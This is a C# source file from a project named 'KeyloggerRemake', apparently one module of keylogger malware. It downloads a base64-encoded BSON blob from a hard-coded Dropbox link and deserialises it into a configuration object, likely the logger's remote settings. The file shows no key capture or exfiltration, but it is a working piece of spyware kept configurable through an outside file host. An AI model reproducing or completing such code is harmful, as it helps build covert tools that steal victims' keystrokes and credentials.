using System;
using System.Net;
using System.IO;
using Newtonsoft.Json;
using Newtonsoft.Json.Bson;

namespace KeyloggerRemake
{
    class classGetEncryption
    {
        public static string getEncryptedKey()
        {
            var strEncryptedFile = "https://www.dropbox.com/s/b01jcu0hde4mw4n/EncryptedJSON.txt?dl=1";
            var strEncryptedKey = "";

            using (WebClient wc = new WebClient())
            {
                strEncryptedKey = wc.DownloadString(strEncryptedFile);
            }

            return strEncryptedKey;
        }

        public static classJsonObj.classJson decryptBson(string strKey)
        {
            byte[] data = Convert.FromBase64String(strKey);

            MemoryStream ms = new MemoryStream(data);
            using (BsonReader reader = new BsonReader(ms))
            {
                JsonSerializer serializer = new JsonSerializer();

                return serializer.Deserialize<classJsonObj.classJson>(reader);
            }
        }
    }
}
